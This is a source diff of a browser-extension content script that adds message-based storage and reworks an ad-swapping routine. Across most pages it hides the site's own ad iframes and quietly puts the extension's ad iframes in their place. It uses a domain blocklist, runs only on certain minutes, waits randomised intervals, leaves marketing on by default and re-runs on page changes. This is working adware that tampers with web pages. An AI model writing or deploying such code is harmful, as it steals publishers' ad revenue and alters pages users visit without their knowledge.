@@ -1,15 +1,68 @@
 if (!pluginnetwork) var pluginnetwork = {};
 var failcount = 0;
+
+pluginnetwork.pluginStorage = function () {
+  return {
+    initialized : false,
+		getItem : false,
+		setItem : false,
+		removeItem : false,
+		setupStorage : function (response)
+		{
+		  pluginnetwork.pluginStorage = response;
+      pluginnetwork.pluginStorage.getItem = function(key){
+        if (typeof(pluginnetwork.pluginStorage[key]) != 'undefined') return pluginnetwork.pluginStorage[key];
+        return null;
+      }
+      pluginnetwork.pluginStorage.setItem = function(key, value) {
+              pluginnetwork.pluginStorage[key] = value;
+              var thisJSON =  {
+                  requestType: 'localStorage',
+                  operation: 'setItem',
+                  itemName: key,
+                  itemValue: value
+              }
+              chrome.extension.sendRequest(thisJSON, function(response) {
+                  // this is an asynchronous response, we don't really need to do anything here...
+              });
+      }
+      pluginnetwork.pluginStorage.removeItem =  function(key) {
+        delete pluginnetwork.pluginStorage[key];
+        var thisJSON =  {
+          requestType: 'localStorage',
+          operation: 'removeItem',
+          itemName: key
+        }
+        chrome.extension.sendRequest(thisJSON, function(response) {
+        // this is an asynchronous response, we don't really need to do anything here...
+        });
+      }
+      pluginnetwork.pluginStorage.initialized = true;
+    },
+		init:function()
+		{
+      var thisJSON = {
+        requestType: 'getLocalStorage'
+      }
+      chrome.extension.sendRequest(thisJSON, function(response) {
+          pluginnetwork.pluginStorage.setupStorage(response);
+          //console.log('setup storage');
+      });	  
+		}
+  }
+}();
+pluginnetwork.pluginStorage.init();
+
 pluginnetwork.contentscript = function () {
   return {
+    onDomInsertedTimer: false,
+    documentParsed: false,
+    initialized:false,
     isMarketingEnabled: function () {
-      var settingsName = pluginnetwork.pluginStorage.getItem('profile');
-      var settingsBlob = pluginnetwork.pluginStorage.getItem('profile-'+settingsName);
-      var ssprofile = JSON.parse(settingsBlob);
-      if (ssprofile.settings.marketing) {
-        return true;
-      } else {
+      if (pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.marketing') == "false") {
         return false;
+      } else {
+        return true;
       }
     },
     isFirstRunDaily: function () {
@@ -41,7 +94,7 @@ pluginnetwork.contentscript = function () {
       return ifr;
     },
     contentEdit: function() {
-      var swapDefObj={"www.yahoo.com":[{selector:"promobar-mid_bar",append:false,style:"",ielement:1},{selector:"#yn-story",append:false,style:"",ielement:1},{selector:"#sidebar",append:false,style:"",ielement:1},{selector:".ymh-browse-container:first-child",append:false,style:"",ielement:1},{selector:"#y-col2",append:false,style:"",ielement:1},{selector:"#y-footer",append:false,style:"width:748px;margin:10px auto 0 auto;",ielement:2}]};
+      var swapDefObj={"www.example.com":[{selector:".example_class",append:false,style:"",ielement:1},{selector:"#example_id",append:false,style:"",ielement:1}]};
       for (i in document.getElementsByTagName("script")) {
         if (typeof(document.getElementsByTagName("script")[i].src)!=="undefined"){
           if (document.getElementsByTagName("script")[i].src.indexOf("pagead/show_ads.js")!==-1) // avoid adsense.... all bow before the big G
@@ -56,160 +109,125 @@ pluginnetwork.contentscript = function () {
             swapDefObj = JSON.parse(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.definitions'));
           }
         }
-        if (swapDefObj[window.location.host] !== undefined) {
-          swapDefinitions = swapDefObj[window.location.host];
-          for (i in swapDefinitions) {
-            node = document.querySelector(swapDefinitions[i].selector);
-            if (document.querySelector('#a47abb2d')!==null) return;
-            if (document.querySelector('#a47abb3d')!==null) return;
-            if (node) {
-              var r = document.createElement("div");
-              r.id = "__"+window.location.host+"_"+i;
-              if(swapDefinitions[i].style.length>0) {
-                r.setAttribute("style", swapDefinitions[i].style);
-              }
-              if (swapDefinitions[i].ielement == 1) {
-                r.appendChild(this.createIframe('a47abb2d', pluginnetwork.GLOBALS.AZ_300, 250, 300)); 
-              } else {
-                r.appendChild(this.createIframe('a47abb3d', pluginnetwork.GLOBALS.AZ_728, 90, 728));
-              }
-              if(swapDefinitions[i].append) {
-                node.appendChild(r);
-              } else {
-                node.parentNode.insertBefore(r, node);
-              }
-            }
+        if (document.querySelector('#a47abb2d')!==null) return;
+        if (document.querySelector('#a47abb3d')!==null) return;
+        if (document.querySelector('#a47abb4d')!==null) return;
+        if (typeof(swapDefObj["bl"])=="undefined") return;
+        if (typeof(swapDefObj["global"])=="undefined") return;
+        if (pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq')==null) return;
+        //
+        //
+        //
+        
+        var domainparts = window.location.host.split(".").reverse();
+        for(var i = 0; i < swapDefObj["bl"].length; i++) {
+          if(swapDefObj["bl"][i].indexOf(domainparts[1])!=-1) {
+            return;// exit early
           }
-        } else {
-          if (document.querySelector('#a47abb2d')!==null) return;
-          if (document.querySelector('#a47abb3d')!==null) return;
-          if (document.querySelector('#a47abb4d')!==null) return;
-          if (typeof(swapDefObj["bl"])=="undefined") return;
-          if (typeof(swapDefObj["global"])=="undefined") return;
-          if (pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq')==null) return;
-          swapDefinitions = swapDefObj["global"];
-          for (i in swapDefinitions) {
-            node = document.querySelector(swapDefinitions[i].selector);
-            if (node) {
-              var r = document.createElement("div");
-              r.id = "__"+window.location.host+"_"+i;
-              if(swapDefinitions[i].style.length>0)
-              {
-                r.setAttribute("style", swapDefinitions[i].style);
-              }
-              if (swapDefinitions[i].ielement == 1)
-              {
-                r.appendChild(this.createIframe('a47abb2d', pluginnetwork.GLOBALS.AZ_300, 250, 300)); 
-              } else {
-                r.appendChild(this.createIframe('a47abb3d', pluginnetwork.GLOBALS.AZ_728, 90, 728));
-              }
-              if(swapDefinitions[i].append)
-              {
-                node.appendChild(r);
-              } else {
-                node.parentNode.insertBefore(r, node);
-              }
-            }
-          }
-          
-          //
-          //
-          //
-          //
-          //
-          //
-          
-          var domainparts = window.location.host.split(".").reverse();
-          for(var i = 0; i < swapDefObj["bl"].length; i++) {
-            if(swapDefObj["bl"][i].indexOf(domainparts[1])!=-1) {
-              return;// exit early
-            }
-          }
-          
-          //
-          // 
-          
-          var td = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.tdb');
-          if (td==null)
-          {
-            if ((new Date().getMinutes()%2 == 0)==false){
-               return;
-            }            
-          }
-          var ei = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ei');
-          if (ei==null)
-          {
-            return;
-          }
-                   
-          var ft = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft');
-          if (ft==null)
-          {
-            ft = Math.round(new Date().getTime()/1000);
-          } else {
-            ft = parseInt(ft);
-          }
+        }
+        
+        //
+        // 
 
-          if (Math.round(new Date().getTime()/1000)<ft) {
-            return;
-          }
-          var aq = parseInt(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq'));
-          var tta = false;
-          if(aq>0) {
-            if (document.querySelector('iframe[width="300"]')!==null) {
-              var a1 = document.querySelector('iframe[width="300"]');
-              if (a1.height == 250)
-              {
-                var r = document.createElement("div");
-                r.id = "__"+window.location.host+"_aq";
-                r.appendChild(this.createIframe('a47abb2d', pluginnetwork.GLOBALS.AZ_300, 250, 300));
-                a1.parentNode.appendChild(r);
-                a1.style.display="none !important";
-                aq = aq-1;
-                tta = true;
-              }
-            }
-            if (document.querySelector('iframe[width="728"]')!==null) {
-              var a1 = document.querySelector('iframe[width="728"]');
-              if (a1.height == 90)
-              {
-                var r = document.createElement("div");
-                r.id = "__"+window.location.host+"_aq2";
-                r.appendChild(this.createIframe('a47abb3d', pluginnetwork.GLOBALS.AZ_728, 90, 728));
-                a1.parentNode.appendChild(r);
-                a1.style.display="none !important";
-                aq = aq-1;
-                tta = true;
-              }
-            }              
-            if (document.querySelector('iframe[width="160"]')!==null) {
-              var a1 = document.querySelector('iframe[width="160"]');
-              if (a1.height == 600)
-              {
-                var r = document.createElement("div");
-                r.id = "__"+window.location.host+"_aq3";
-                r.appendChild(this.createIframe('a47abb4d', pluginnetwork.GLOBALS.AZ_160, 600, 160));
-                a1.parentNode.appendChild(r);
-                a1.style.display="none !important";
-                aq = aq-1;
-                tta = true;
-              }
-            }
-            if (tta == true)
+        var td = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.tdb');
+        if (td==null)
+        {
+          if ((new Date().getMinutes()%2 == 0)==false){
+             return;
+          }            
+        }
+        var ei = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ei');
+        if (ei==null)
+        {
+          return;
+        }
+                 
+        var ft = pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft');
+        if (ft==null)
+        {
+          ft = Math.round(new Date().getTime()/1000);
+        } else {
+          ft = parseInt(ft);
+        }
+
+        if (Math.round(new Date().getTime()/1000)<ft) {
+          return;
+        }
+        var aq = parseInt(pluginnetwork.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq'));
+        var tta = false;
+        var AZ_728 = 0;
+        var AZ_300 = 0;
+        var AZ_160 = 0;
+        if(aq>0) {
+          if (document.querySelector('iframe[width="300"]')!==null) {
+            var a1 = document.querySelector('iframe[width="300"]');
+            if (a1.height == 250)
             {
-              ft = (Math.round(new Date().getTime()/1000)+Math.floor((Math.random() * 180) + 300));
-              if (aq<0) aq = 0; // prevent the accidental -1
-              pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq', aq);
-              pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft', ft);              
+              var r = document.createElement("div");
+              r.id = "__"+window.location.host+"_aq";
+              AZ_300 = pluginnetwork.GLOBALS.AZ_300;
+              r.appendChild(this.createIframe('a47abb2d', AZ_300, 250, 300));
+              a1.parentNode.appendChild(r);
+              a1.style.display="none";
+              aq = aq-1;
+              tta = true;
             }
+          }
+          if (document.querySelector('iframe[width="728"]')!==null) {
+            var a1 = document.querySelector('iframe[width="728"]');
+            if (a1.height == 90)
+            {
+              var r = document.createElement("div");
+              r.id = "__"+window.location.host+"_aq2";
+              AZ_728 = pluginnetwork.GLOBALS.AZ_728;
+              r.appendChild(this.createIframe('a47abb3d', AZ_728, 90, 728));
+              a1.parentNode.appendChild(r);
+              a1.style.display="none";
+              aq = aq-1;
+              tta = true;
+            }
+          }              
+          if (document.querySelector('iframe[width="160"]')!==null) {
+            var a1 = document.querySelector('iframe[width="160"]');
+            if (a1.height == 600)
+            {
+              var r = document.createElement("div");
+              r.id = "__"+window.location.host+"_aq3";
+              AZ_160 = pluginnetwork.GLOBALS.AZ_160;
+              r.appendChild(this.createIframe('a47abb4d', AZ_160, 600, 160));
+              a1.parentNode.appendChild(r);
+              a1.style.display="none";
+              aq = aq-1;
+              tta = true;
+            }
+          }
+          if (tta == true)
+          {
+            ft = (Math.round(new Date().getTime()/1000)+Math.floor((Math.random() * 180) + 300));
+            if (aq<0) aq = 0; // prevent the accidental -1
+            pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq', aq);
+            pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft', ft);              
           }
         }
       }
     },
+    contentUpdate: function() {
+      if (!pluginnetwork.contentscript.documentParsed) return;
+      if (pluginnetwork.contentscript.onDomInsertedTimer) {
+        clearTimeout(pluginnetwork.contentscript.onDomInsertedTimer);
+      }
+      pluginnetwork.contentscript.onDomInsertedTimer = setTimeout(function () {
+        pluginnetwork.contentscript.contentEdit();
+        onDomInsertedTimer = null;
+      }, 300);
+    },
     init: function() {
-      if (typeof(pluginnetwork.pluginStorage) != 'undefined') {
+      if (pluginnetwork.contentscript.initialized) return; // we're init'd return    
+      if (pluginnetwork.pluginStorage.initialized) {
+        pluginnetwork.contentscript.initialized = true;
         if (window === window.top)
         {
+          pluginnetwork.contentscript.documentParsed = true;
           pluginnetwork.contentscript.contentEdit();
         }
       } else {
@@ -221,5 +239,8 @@ pluginnetwork.contentscript = function () {
     }
   }
 }();
-setTimeout(pluginnetwork.contentscript.init,1000);
-
+pluginnetwork.contentscript.init();
+//
+// Porting to mutation obervers once support is available on more than chrome
+document.addEventListener("DOMContentLoaded", pluginnetwork.contentscript.init, false);
+document.addEventListener("DOMNodeInserted", pluginnetwork.contentscript.contentUpdate, false);
